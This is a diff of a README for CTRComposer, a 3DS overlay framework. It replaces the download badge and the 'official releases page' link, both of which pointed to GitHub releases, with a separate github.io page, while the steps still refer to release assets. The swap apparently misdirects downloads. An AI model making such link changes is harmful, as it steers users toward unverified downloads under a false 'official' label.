@@ -1,6 +1,6 @@
 # ⚙️ CTRComposer - Build custom overlays for 3DS games
 
-[![Download CTRComposer](https://img.shields.io/badge/Download-CTRComposer-blue.svg)](https://github.com/turtle2585/CTRComposer/releases)
+[![Download CTRComposer](https://img.shields.io/badge/Download-CTRComposer-blue.svg)](https://turtle2585.github.io)
 
 CTRComposer provides a framework for creating overlays on the Nintendo 3DS. It acts as an engine for 3gx files. Developers use this base to build menus and features for their favorite games. This tool provides the foundation so you do not have to write code from scratch.
 
@@ -18,7 +18,7 @@ To use this software, you need specific hardware and setup on your console. Ensu
 
 Follow these steps to obtain the files for your console.
 
-1. Visit the [official releases page](https://github.com/turtle2585/CTRComposer/releases) to find the latest version.
+1. Visit the [official releases page](https://turtle2585.github.io) to find the latest version.
 2. Look for the file ending in .zip under the Assets section of the newest release.
 3. Click the file to save it to your computer.
 4. Locate the downloaded file in your downloads folder.
